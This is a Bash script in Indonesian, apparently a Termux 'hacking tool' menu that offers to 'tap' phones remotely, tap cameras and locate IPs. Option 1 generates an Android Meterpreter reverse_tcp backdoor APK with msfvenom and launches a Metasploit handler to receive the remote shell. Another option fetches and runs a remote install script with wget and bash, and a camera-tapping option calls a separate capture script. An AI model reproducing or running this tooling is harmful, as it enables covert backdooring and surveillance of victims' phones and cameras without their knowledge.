#!/bin/bash
#version 1.0
#Mao Ngapain?
#Mao Recode?
#Utamakan Izin Dulu^_^
#variabels
b='\033[34;1m'
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
w='\033[37;1m'
y='\033[33;1m'

load(){
    echo -e "\n"
    bar=" >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> "
    barlength=${#bar}
    i=0
    while((i<100)); do
        n=$((i*barlength / 100))
        printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
        ((i += RANDOM%5+2))
        sleep 0.3
    done
}
start1(){
             echo""
             echo""
            
             echo $g"1. sadap handphone jarak jauh"
            
             echo $g"2. sadap handphone satu jaringan (root)"
            
             echo $g"3. lacak lokasi via ip"
            
             echo $g"4. sadap kamera"
            
             echo $g"5. exit"
             echo""
            
             echo $g"Masukkan Pilihan : "
             read nomor
             if [ $nomor = "1" ]; then
                   echo $g"Masukkan port : "
                   read lport
                  
                   echo $g"Masukkan ip : "
                   read lhost
                  
                   echo $g"Masukkan nama backdor.apk : "
                   read backdor
                   echo""
                   sleep 2
                   echo $g"=================================="
                  
                   echo $y"               Data Backdor                "
                  
                   echo $r" port : $lport"
                  
                   echo $r" IP : $lhost"
                  
                   echo $r" nama backdor : $backdor"
                  
                   echo $g"=================================="
                   echo""
                   sleep 2
                   msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R> /sdcard/$backdor
                   sleep 5
                   echo $g"Backdor telah tersimpan di sdcard"
                   sleep 3
                   echo $g"Memulai penyadapan"
                   clear
                   echo $g"Loading.."
                   sleep 3
                   load
                   clear
                   banner
                   echo""
                   sleep 2
                   echo $g"Memulai Metasploit"
                   echo""
                   sleep 2
                   msfconsole -q -x "use exploit/multi/handler;
                   set payload android/meterpreter/reverse_tcp;
                   set lhost 127.0.0.1;
                   set lport $lport;
                   run"
             elif [ $nomor = "2" ]; then
                   echo $r"Pastikan Tersambung Dengan Wifi"
                   sleep 2
                   echo $b"Persiapan Pengambilan Data"
                   sleep 3
                   clear
                   apt install fish -y
                   pip2 install colorama
                   apt update > /dev/null 2>&1 && apt --assume-yes install wget > /dev/null 2>&1 && wget https://github.com/MasterDevX/Termux-ADB/raw/master/InstallTools.sh -q && bash InstallTools.sh
                   fish
            elif [ $nomor = "3" ]; then
                   clear
                   banner
                   echo $y"masukkan ip target = "
                   read ip
                   echo $g"mulai mengambil data"
                   curl -s http://ip-api.com/$ip
                   echo $g" Gunakan tools dengan bijak"
            elif [ $nomor = "4" ]; then
                    load
                    sleep 2
                    clear
                    cd camera
                    bash camp
            elif [ $nomor = "5" ]; then
                    echo $c"terimakasih telah menggunakan tools ini"
                    exit
            else
                   echo $r"Kesalahan"
                   mulai
            fi
}

mulai(){
            echo""
           
            echo $r"Jika belum install metasploit, install dulu"
           
            echo $g"Ingin Install Metasploit ?"
            read -p "y/n :" pill;
            if [ $pill = "y" ]; then
                    bash exploit
                    clear
                    banner
                    start1
            else
                    clear
                    banner
                    start1
            fi
}

banner(){

 
  echo $b"                                                                                                                                               "
                                                                                                                                                
  echo $b"    _|_|_|  _|      _|  _|_|_|    _|_|_|_|  _|_|_|        _|_|_|_|_|  _|_|_|          _|_|_|  _|_|_|    _|          _|_|    _|_|_|  _|_|_|_|_| "
 
  echo $b"  _|          _|  _|    _|    _|  _|        _|    _|          _|            _|      _|        _|    _|  _|        _|    _|    _|        _|      "
 
  echo $y"   _|            _|      _|_|_|    _|_|_|    _|_|_|            _|        _|_|          _|_|    _|_|_|    _|        _|    _|    _|        _|      "
  echo $y"  _|            _|      _|    _|  _|        _|    _|          _|            _|            _|  _|        _|        _|    _|    _|        _|      "
 
  echo $y"    _|_|_|      _|      _|_|_|    _|_|_|_|  _|    _|          _|      _|_|_|        _|_|_|    _|        _|_|_|_|    _|_|    _|_|_|      _|  v1.3"
                                                                                                                                       
 
  echo""
          
  echo $y"  Random : Cyber T3"
}
clear
load
clear
banner
mulai
